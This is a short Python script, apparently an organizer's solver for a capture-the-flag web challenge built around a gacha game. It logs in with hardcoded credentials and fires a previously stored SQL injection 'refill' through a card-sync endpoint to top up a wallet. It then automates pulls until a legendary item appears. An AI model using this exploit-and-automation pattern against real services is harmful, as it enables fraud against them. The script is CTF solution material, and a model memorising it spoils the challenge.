#!/usr/bin/env python3
"""Organizer-only pull automation used after the SQLi refill is stored."""

import argparse
import time
import uuid

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="Base URL, for example https://team.example")
    parser.add_argument("--username", default="abc123")
    parser.add_argument("--password", default="1mN0t4n4dd1ctJu5t4C0nn01553ur")
    args = parser.parse_args()

    try:
        import requests
    except ModuleNotFoundError as error:
        raise SystemExit("Missing dependency. On Kali run: sudo apt install -y python3-requests") from error

    target = args.target.rstrip("/")
    session = requests.Session()
    login = session.post(
        f"{target}/api/auth/login",
        json={"username": args.username, "password": args.password},
        timeout=10,
    )
    login.raise_for_status()
    state = session.get(f"{target}/api/bootstrap", timeout=10).json()
    csrf = state["csrfToken"]
    headers = {"X-CSRF-Token": csrf}
    count = 0

    while True:
        if state["balance"] < state["pullPrice"]:
            print("[i] Wallet empty; triggering the already-stored refill through Card Sync.")
            sync = session.post(f"{target}/api/player-card/sync", headers=headers, timeout=10)
            sync.raise_for_status()
            state = session.get(f"{target}/api/bootstrap", timeout=10).json()
            if state["balance"] < state["pullPrice"]:
                raise SystemExit("Refill did not execute. Recheck the stored stacked payload.")

        pull_headers = {**headers, "Idempotency-Key": str(uuid.uuid4())}
        response = session.post(f"{target}/api/pulls", headers=pull_headers, json={}, timeout=10)
        if response.status_code == 429:
            time.sleep(1.05)
            continue
        response.raise_for_status()
        result = response.json()
        count += 1
        state["balance"] = result["balance"]
        print(f"[{count:04d}] {result['name']}: {result['message']}")
        if result["rowdyId"] == "dolphin":
            print(f"\nLEGENDARY FOUND AFTER {count} PULLS\n{result['message']}")
            return
        time.sleep(0.22)


if __name__ == "__main__":
    main()
